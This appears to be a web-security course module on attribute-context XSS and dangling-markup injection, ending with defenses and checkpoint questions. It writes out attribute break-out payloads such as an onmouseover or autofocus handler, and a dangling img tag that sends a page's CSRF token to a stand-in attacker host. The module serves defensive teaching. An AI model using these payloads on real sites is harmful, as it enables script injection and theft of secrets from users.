Attribute Injection & Context Breaking attack

Your input often lands inside an existing tag's attribute — not in free HTML. You may not even be able to use <. The key that opens this lock is a single quote character.

The setup: reflection into an attribute value

Module 08's /profile endpoint places name here:

<input name="name" value="YOUR INPUT">

You are inside the double-quoted value attribute. To do anything, you must first break out of the attribute — supply a " to end the value, then add your own attribute or tag.

Break-out ladder (least to most)

GoalPayload for name=Result
Add an event handler, no new tag" onmouseover="alert(1)→ <input value="" onmouseover="alert(1)"> — fires on hover, no < or > used
Auto-fire, no interaction" autofocus onfocus="alert(1)fires on load

Why "no angle brackets" matters

Many filters and even some frameworks focus on < and >. Attribute break-out with onmouseover uses neither. This is the empirical reason the correct fix is context-aware encoding of the quote characters, not stripping angle brackets:

  • In a double-quoted attribute you must encode " (→ &quot;).
  • In a single-quoted attribute you must encode '.
  • In an unquoted attribute, whitespace (space, tab, newline, /) ends the value — so x onmouseover=alert(1) injects a second attribute with no quote at all. This is why "always quote your attributes" is a hard rule.
<!-- unquoted value: a space starts a new attribute -->
<a href=SEARCH>   with SEARCH = x onmouseover=alert(1)
   → <a href=x onmouseover=alert(1)>

Dangling markup: stealing data with no JavaScript

Sometimes CSP or a filter blocks script execution but you can still inject markup into an attribute/tag. Dangling markup injection abuses the parser's willingness to keep reading an unterminated attribute across the rest of the page — sweeping secret content into a URL that the browser then fetches, leaking it to an attacker server.

<!-- Injected at the top of a page that later contains a CSRF token: -->
<img src="//attacker.example/collect?leak=
<!-- the browser treats everything up to the NEXT quote as the URL,
     swallowing the page's HTML (including the token) into the query string,
     then fetches it — exfiltration with zero script. -->

Variants use <base href>, an unterminated <textarea>/<title>, or a form whose action points offsite. The preload scanner (Module 02) can even start the fetch during parsing. In the lab, point the src at your own callback_server.py from Module 11 to see the leak arrive.

Why this matters for your thesis. Dangling markup shows that "no script executed" is not the same as "no compromise." A defense scoped only to script execution (some CSP configurations) can still leak secrets. A complete defense must also constrain markup-driven data flows (base-uri, form-action, and encoding that prevents attribute break-out in the first place).

The defense, precisely

  1. Encode for the attribute context: at minimum the active quote character; robust encoders also handle < > & and backtick.
  2. Always quote attributes so whitespace can't terminate a value.
  3. CSP base-uri 'none' and form-action to blunt dangling-markup exfiltration.
  4. Prefer frameworks that encode by context automatically — but know their escape hatches (Module 14/17).

Checkpoint

  1. Write an attribute-context payload that executes with no < or > and explain what each character does.
  2. Why does an unquoted attribute need a different mental model than a quoted one?
  3. Explain how dangling markup exfiltrates a CSRF token without running any script, and which CSP directives interfere with it.
